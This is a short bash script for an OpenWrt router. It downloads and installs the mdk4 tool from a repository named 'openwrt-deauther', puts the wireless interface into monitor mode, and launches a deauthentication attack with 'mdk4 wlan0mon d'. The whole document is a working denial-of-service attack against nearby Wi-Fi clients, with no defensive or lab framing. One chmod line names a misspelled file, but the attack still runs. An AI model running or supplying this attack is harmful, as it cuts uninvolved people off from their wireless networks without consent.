#!/bin/bash

opkg update
wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk
opkg install mdk4.ipk

cat > wlan0mon.sh << EOF
iw phy phy0 interface add wlan0mon type monitor
echo 'monitor mode enable in wlan0mon'
ip link set wlan0mon up
EOF
#
chmod +x wlan0monmon.sh
#
bash wlan0mon.sh && mdk4 wlan0mon d

